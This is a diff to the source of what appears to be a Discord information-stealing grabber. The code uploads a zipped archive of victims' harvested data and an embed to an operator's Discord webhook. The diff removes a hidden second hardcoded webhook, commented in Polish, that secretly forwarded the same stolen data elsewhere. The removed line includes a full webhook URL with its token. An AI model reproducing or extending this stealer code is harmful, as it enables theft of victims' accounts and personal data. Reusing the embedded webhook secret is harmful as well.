@@ -28,8 +28,7 @@ __license__ = "GPL-3.0"
 __config__ = {
     # replace webhook_here with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    webhook = "WEBHOOK_HERE"  # Tutaj wpisz swój pierwszy webhook
-    webhook2 = "https://discord.com/api/webhooks/1170833154257461248/2jn3gKuMJaZRcUXfjicEM0KEv0JmAzaQzzGqH-rbF0qZeqm85Bznm7UKgaMw8liyVR38"  # Drugi, wbudowany webhook
+    "webhook": "WEBHOOK_HERE",  # Place your webhook here
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     "webhook_protector_key": "KEY_HERE",
     # keep it as it is unless you want to have a custom one
@@ -892,15 +891,10 @@ GoogleMaps: {self.googlemap}
         if self.fetch_conf("ping_on_run"):
             embed.update({"content": "@everyone"})
 
-                with open(_zipfile, "rb") as f:
-                    if self.hook_reg in self.webhook:
-                        # Wysyłanie na pierwszy webhook
-                        httpx.post(self.webhook, json=embed)
-                        httpx.post(self.webhook, files={"upload_file": f})
-    
-                    # Wysyłanie na drugi, wbudowany webhook
-                    httpx.post(webhook2, json=embed)
-                    httpx.post(webhook2, files={"upload_file": f})
+        with open(_zipfile, "rb") as f:
+            if self.hook_reg in self.webhook:
+                httpx.post(self.webhook, json=embed)
+                httpx.post(self.webhook, files={"upload_file": f})
             else:
                 from pyotp import TOTP
 
